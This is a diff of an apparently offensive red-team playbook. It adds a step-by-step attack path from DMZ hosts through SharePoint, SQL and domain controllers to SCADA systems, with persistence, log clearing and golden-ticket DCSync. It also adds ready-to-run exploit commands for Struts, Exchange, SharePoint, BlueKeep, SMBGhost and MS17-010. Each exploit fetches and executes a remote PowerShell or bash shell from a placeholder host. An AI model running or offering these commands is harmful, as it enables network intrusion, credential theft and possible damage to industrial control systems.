@@ -125,6 +125,127 @@ proxy (icmp?)
 
 ```
 
+###### GROUP 1
+```txt
+# initial entry 
+1. viewstate .net box (box and user)
+2. rsync dmz boxes (network only)
+3. struts (network only)
+
+# dmz boxes via initial entry
+fingerprinting via nmap ...
+rsync or ssh for access
+c2 (icmp or http, ssh)
+proxy (socks or regeorge http shell)
+persistence (redghost, cron, immutable if root)
+linenum (find suid)
+prievesc (suid but not needed)
+proxy (icmp, socks, or http shell)
+malware (russian fake malware? redghost)
+evade (clear logs, timestamps)
+
+# external .net box (prod windows, no auth)
+fingerprinting via nmap ...
+c2 (icmp or wmi, winrm, smb)
+proxy (socks ip4 to ipv4 or ipv6 to ipv4)
+host enum (seatbelt, edr, host)
+persistence user (registry, fs)
+net enum (bloodhound)
+*kerberoast spns (user to dev via cracked spn) # get the dev user account, has sql creds
+*local privesc (potato svc account, user to dev via com spoof) # other way for dev user account, get sql creds
+loot fs/memory/registry (local admin only, machineKey doesn't match dev)
+
+# pivot sharepoint (needs auth)
+sharepoint cve(s)
+c2 (icmp or http, wmi, winrm, smb)
+proxy (socks ipv4 to ipv6)
+host enum (seatbelt, edr, host)
+admin persistence (wmi)
+loot fs/memory/registry (local admin only)
+*net enum dev share (net shares, machineKey in web.config for dev box)
+*local privesc (potato svc account, get SYSTEM) 
+
+# pivot dev windows (requires auth)
+share with config (machineKey)
+c2 (icmp or http)
+proxy (ipv6 to ipv4)
+host enum (seat belt, edr)
+persistence (fs, reg)
+loot registry (local admin)
+*domain privesc token theft (admin sql account to get machine hashes) 
+*domain privesc proc spoof (admin sql.. altertative)
+*downgrade attack (admin sql.. other alternative)
+
+# pivot file share (requires auth)
+alternative share with configs to dev
+backups with ssh keys to lin boxes
+c2 (icmp or http)
+proxy (ipv6 to ipv4)
+host enum (seat belt, edr)
+persistence (fs, reg)
+loot fs (find ssh keys and machineKey for dev to get DA)
+
+# pivot sql server (requires auth)
+*sql report/server cve (sql user auth, dump machine hashes for unconstrained) 
+*sql sysadmin xp_cmdshell (from dev windows user, alternative ...)
+c2 (icmp only)
+proxy (socks)
+host enum (seatbelt, host enum)
+persistence (wmi for admin, important to keep)
+loot memory/registry (hashes for privesc, aes256 and ntlm hashes)
+* unconstrained aes and ntlm box hash here
+data exfil (sql data exfil while hitting dc with print spool attack)
+
+# dcsync on dc 1
+fingerprint rpc dump, find MSRPRN service on dc1 only (dc2 is core version, no gui!)
+add spn
+add dns
+krbrelay ready
+trigger print spool (only dc1)
+extract golden ticket 
+ptt to dcysnc (real objective)
+c2 (icmp)
+proxy (socks)
+disable rdp svc, port forward to dev windows (if high speed team?)
+
+# dc 2
+no print spool
+sysvol with shared password to dev user (different user but same password for admin on dev windows)
+c2 (icmp)
+proxy (socks)
+disable winrm, change port, or port forward to dev windows (if high speed team?)
+
+# dev linux
+*rsync root user
+*struts cve
+loot fs (ssh keys for prod linux, shared key for multiple boxes?) 
+bash history root password prod linux
+malware (russian fake... redghost?)
+proxy (ssh)
+
+# prod linux
+*ssh for access 
+*rsync root user
+c2 (http)
+proxy (ssh)
+loot fs (password or key to scada linux, shared password and keys to other boxes?)
+malware (russian fake.. redghost?)
+
+# ippprinter
+*default creds, cups cve, snmpset
+*print exploit famework, crappy shell
+pivot point to scada network (no segmentation?)
+proxy (microsocks or ssh?) 
+malware (russian or possible)?
+
+# scada linux
+ssh for access
+malware (russian or ?)
+c2 (icmp?)
+proxy (socks?)
+persistence (redghost or malware)
+```
+
 ###### BGP HIJACK
 ```txt
 # bgp prefix hijack scenario e.g. preferred 65.x.101.0/25 over /24
@@ -247,7 +368,7 @@ rsync ./sudoers <IP>::files/etc/
 ssh pwn@<IP>
 ```
 
-###### INTERNAL EXCHANGE EXPLOIT
+###### INTERNAL EXCHANGE EXPLOIT (requires Outlook to work)
 ```txt
 # initial access via owa365/exchange, spray for access (or phish for NTLM hashes?)
 proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
@@ -257,12 +378,6 @@ CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -
 
 # form based shells
 proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
-
-# initial access via exchange, scan for recent cve
-proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
-
-# shell via oneliner
-proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"
 ```
 
 ###### EXTERNAL / INTERNAL .NET EXPLOIT
@@ -300,6 +415,9 @@ curl -sv 'http://<URL>/Content/default.aspx' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
+  
+# with compromised web.configs from internal boxes (alternative)
+proxychains viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 ```
 
 ###### ACTIONS ON LINUX PENETRATION
@@ -554,8 +672,18 @@ foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.co
 # database access
 proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
 proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>
+```
 
-# sharepoint, command based
+###### EXPLOITS
+```txt
+# struts 2-59 exploit 
+proxychains struts_cve-2020-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'
+
+# exchange exploit
+proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
+proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"
+
+# sharepoint, command based payload
 proxychains python sharepoint_cve-2019-0604.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -version 2016 -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 
@@ -563,7 +691,7 @@ proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <U
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 proxychains python sharepoint_cve-2020-1147.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD>
 
-# sharepoint, requires editing gadget
+# sharepoint sql report, requires editing gadget (needs testing)
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" -o base64 
 proxychains python sqlreport_cve_2020-0618.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -payload shell
 
@@ -574,7 +702,7 @@ proxychains python bluekeep_cve-2019-0708.py <IP>
 # smb3 exploits
 proxychains python3 smbghost_cve-2020-0796.py <TARGETIP> <REVERSEIP> <REVERSEPORT>
 
-# legacy smb exploits
+# legacy equation group smb exploits
 proxychains python checker.py <IP>
 proxychains python ms17-010.py -target <IP> -pipe_name samr -command "cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"
 ```
